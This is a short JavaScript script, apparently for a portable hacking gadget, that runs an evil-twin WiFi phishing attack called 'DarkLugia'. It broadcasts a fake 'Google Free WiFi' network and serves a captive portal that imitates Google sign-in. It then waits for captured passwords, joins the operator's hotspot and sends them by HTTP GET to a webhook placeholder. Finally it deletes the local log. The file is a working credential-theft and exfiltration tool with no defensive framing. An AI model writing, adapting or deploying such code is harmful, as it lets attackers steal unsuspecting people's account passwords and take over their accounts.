const path = require("path");
const BASE_DIR = path.resolve(__dirname, "..");

wifi.stop();
wifi.set_ssid("Google Free WiFi");
const portalPath = path.join(BASE_DIR, "DarkLugia", "portals", "Google", "index.html");
wifi.start_portal(portalPath);

display.clear();
const splashPath = path.join(BASE_DIR, "DarkLugia", "assets", "splash.png");
if (storage.exists(splashPath)) {
    display.draw_image(splashPath, 0, 0);
}
display.print("\nPortal: Google Auth");
display.print("Status: WAITING FOR TARGET...");

const logsPath = path.join(BASE_DIR, "DarkLugia", "logs", "passwords.txt");
const logsDir = path.join(BASE_DIR, "DarkLugia", "logs");
if (!storage.exists(logsDir)) {
    storage.mkdir(logsDir);
}

while (true) {
    if (storage.exists(logsPath)) {
        const creds = storage.read(logsPath);
        display.print("DATA FOUND! BEAMING...");

        // TODO: Replace with your hotspot or home WiFi credentials before deployment
        wifi.connect("Your_WiFi_Name", "Your_WiFi_Password");

        if (wifi.is_connected()) {
            http.get("YOUR_WEBHOOK_URL_HERE?source=Google&data=" + creds);

            const roarPath = path.join(BASE_DIR, "DarkLugia", "assets", "roar.wav");
            if (storage.exists(roarPath)) {
                audio.play(roarPath);
            }
            display.print("EMAIL SENT TO MASTER KRAMER");

            storage.remove(logsPath);
            break;
        }
    }
    delay(5000);
}
